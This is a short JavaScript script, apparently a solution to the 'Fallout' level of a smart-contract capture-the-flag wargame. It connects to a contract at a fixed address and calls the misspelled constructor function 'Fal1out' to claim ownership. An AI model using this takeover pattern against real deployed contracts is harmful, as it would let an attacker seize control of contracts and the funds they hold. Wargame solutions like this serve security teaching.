const level2 = async (Fallout) => {

    const targetAddress = '0x9b160eb1fd1a08a881219d43a632b60418c76386';
    const target = await Fallout.at(targetAddress);

    console.log(`Exploiting Level2 target ${targetAddress}...`);

    console.log('Calling Fal1out...');
    await target.Fal1out();
};

module.exports = level2;